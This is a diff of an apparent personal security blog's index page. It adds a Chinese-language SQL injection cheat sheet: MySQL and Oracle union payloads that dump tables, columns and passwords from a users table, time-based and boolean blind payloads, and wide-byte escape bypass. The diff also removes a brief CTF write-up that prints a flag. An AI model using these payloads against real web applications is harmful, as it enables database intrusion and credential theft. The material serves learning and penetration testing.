@@ -69,6 +69,73 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/02/16/sql%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time class="dt-published" datetime="2025-02-16T13:13:04.000Z" itemprop="datePublished">2025-02-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/02/16/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>Mysql 手工注入<br>联合注入<br>?id&#x3D;1’ order by 4–+<br>?id&#x3D;0’ union select 1,2,3,database()–+<br>?id&#x3D;0’ union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() –+<br>?id&#x3D;0’ union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name&#x3D;”users” –+<br>group_concat(column_name) 可替换为 unhex(Hex(cast(column_name+as+char)))column_name<br>?id&#x3D;0’ union select 1,2,3,group_concat(password) from users –+<br>group_concat 可替换为 concat_ws(‘,’,id,users,password )<br>?id&#x3D;0’ union select 1,2,3,password from users limit 0,1–+  </p>
+<p>盲注<br>时间盲注<br>常用函数sleep()<br>分割函数 substr、substring、left<br>分割函数编码后可不用引号，ascii() hex()<br>一般时间盲注我们还需要使用条件判断函数<br>if（expre1，expre2，expre3）</p>
+<p>当 expre1 为true 时，返回 expre2，false 时，返回expre3</p>
+<p>?id&#x3D;1’ and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5))–+<br>?id&#x3D;1’ and if((substr((select user()),1,1)&#x3D;‘r’),sleep(5),1)–+<br>布尔盲注<br>?id&#x3D;1’ and substr((select user()),1,1)&#x3D;’r’ – +<br>?id&#x3D;1’ and IFNULL((substr((select user()),1,1)&#x3D;’r’),0) – +  </p>
+<p>1<br>2<br>3<br>4<br>&#x2F;&#x2F;如果IFNULL第一个参数的表达式为 NULL，则返回第二个参数的备用值，不为 Null 则输出值</p>
+<p>?id&#x3D;1’ and strcmp((substr((select user()),1,1)&#x3D;‘r’),1) – +<br>&#x2F;&#x2F;若所有的字符串均相同，STRCMP() 返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1 ，其它情况返回 1</p>
+<p>insert,delete,update<br>这种注入会出现在 注册、ip头、留言板等等需要写入数据的地方，如用sqlmap会产生大量垃圾数据<br>尝试性插入、引号、双引号、转义符 \ 让语句不能正常执行，然后如果插入失败，更新失败，然后深入测试确定是否存在注入<br>二次注入和宽字节注入<br>二次注入：<br>没有单引号的sql语句中，进行16进制编码，这样就不会带有单引号<br>宽字节注入：</p>
+<p>单引号转义为 ’ ,mysql 会将 \ 编码为 %5c ，宽字节中两个字节代表一个汉字，所以把 %df 加上 %5c 就变成了一个汉字“運”，从而绕过转义</p>
+<p>Oracle 手工注入<br>联合注入</p>
+<p>?id&#x3D;-1’ union select user,null from dual–<br>?id&#x3D;-1’ union select version,null from v$instance–<br>?id&#x3D;-1’ union select table_name,null from (select * from (select rownum as limit,table_name from user_tables) where limit&#x3D;3)–<br>?id&#x3D;-1’ union select column_name,null from (select * from (select rownum as limit,column_name from user_tab_columns where table_name &#x3D;’USERS’) where limit&#x3D;2)–<br>?id&#x3D;-1’ union select username,passwd from users–<br>?id&#x3D;-1’ union select username,passwd from (select * from (select username,passwd,rownum as limit from users) where limit&#x3D;3)–  </p>
+<p>布尔盲注<br>?id&#x3D;1’ and 1&#x3D;(select decode(user,’SYSTEM’,1,0,0) from dual)–<br>?id&#x3D;1’ and 1&#x3D;(select decode(substr(user,1,1),’S’,1,0,0) from dual)–<br>?id&#x3D;1’ and ascii(substr(user,1,1))&gt; 64–  </p>
+<p>1<br>2<br>3<br>4<br>5<br>时间盲注<br>?id&#x3D;1’ and 1&#x3D;(case when ascii(substr(user,1,1))&gt; 128 then DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) else 1 end)–<br>?id&#x3D;1’ and 1&#x3D;(case when ascii(substr(user,1,1))&gt; 64 then DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) else 1 end)–  </p>
+<p>SQL手工注入<br>判断注入点是否存在<br>数字型注入<br>url后输入<br>and 1&#x3D;1<br>and 1&#x3D;2<br>如返回不同，则可判断注入点存在<br>例：</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.cn/news.php?p=1&id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> 1’ 返回错误</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.cn/news.php?p=1&id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> 1 and 1&#x3D;1 返回正确</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.cn/news.php?p=1&id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> 1 and 1&#x3D;2 返回错误</p>
+<p>字符型注入<br>url后输入<br>’ and 1&#x3D;1 and ‘1’&#x3D;’1<br>’ and 1&#x3D;2 and ‘1’&#x3D;’1</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.cn/news.php?p=1&id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> 1’ 返回错误</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.cn/news.php?p=1&id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> 1’ and 1&#x3D;1 and ‘1’&#x3D;’1 返回正确</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.cn/news.php?p=1&id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> 1’ and 1&#x3D;2 and ‘1’&#x3D;’1 返回错误</p>
+<p>搜索型注入<br>输入框中输入<br>’ 返回错误<br>x%’ and 1&#x3D;1 and ‘%’&#x3D;’ 返回正确<br>x%’ and 1&#x3D;2 and ‘%’&#x3D;’ 返回错误<br>判断字段数</p>
+<p>数字型</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.cn/news.php?p=1&id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> 1 order by 26 返回正确</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.cn/news.php?p=1&id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> 1 order by 27 返回错误<br>得出结论：字段数26。</p>
+<p>字符型</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.cn/news.php?p=1&id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> 1’ order by 26 # 返回正确</p>
+<p><a target="_blank" rel="noopener" href="http://www.xxx.cn/news.php?p=1&id=4">http://www.xxx.cn/news.php?p=1&amp;id=4</a> 1’ order by 27 # 返回错误<br>得出结论：字段数26。</p>
+<p>搜索型</p>
+<p>x%’ order by 26 # 返回正确<br>x%’ order by 27 # 返回错误<br>得出结论：字段数26。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/02/16/sql%E6%B3%A8%E5%85%A5/" data-id="cm77nfwdj0000o0x1bapx2y79" data-title="sql注入" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-ISITDTU-2019-EasyPHP" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/02/16/ISITDTU-2019-EasyPHP/" class="article-date">
@@ -540,53 +607,6 @@
 
 
   
-    <article id="post-极客大挑战-2019-Havefun" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2025/01/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun/" class="article-date">
-  <time class="dt-published" datetime="2025-01-26T12:21:29.000Z" itemprop="datePublished">2025-01-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2025/01/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun/">[极客大挑战 2019]Havefun</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>打开靶机，看到有一个小猫，但是没有什么特殊的地方。于是便想到查看源代码。</p>
-<!--
-        $cat=$_GET['cat'];
-        echo $cat;
-        if($cat=='dog'){
-            echo 'Syc{cat_cat_cat_cat}';
-        }
-        -->
-<p>看到最后有如上的一段代码。看到是get传参，便想到在url中输入?cat&#x3D;dog，然后传参。<br>便得到flag&#x3D;{68dd5b2e-74f0-4c19-a280-085a56e1bf1c}</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2025/01/26/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Havefun/" data-id="cm6dlhndw000018x18ruqft8z" data-title="[极客大挑战 2019]Havefun" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -623,6 +643,10 @@
       <ul>
         
           <li>
+            <a href="/2025/02/16/sql%E6%B3%A8%E5%85%A5/">sql注入</a>
+          </li>
+        
+          <li>
             <a href="/2025/02/16/ISITDTU-2019-EasyPHP/">[ISITDTU 2019]EasyPHP</a>
           </li>
         
@@ -636,10 +660,6 @@
         
           <li>
             <a href="/2025/02/09/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-write-shell/">[红明谷CTF 2021]write_shell</a>
-          </li>
-        
-          <li>
-            <a href="/2025/02/07/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">报错注入</a>
           </li>
         
       </ul>
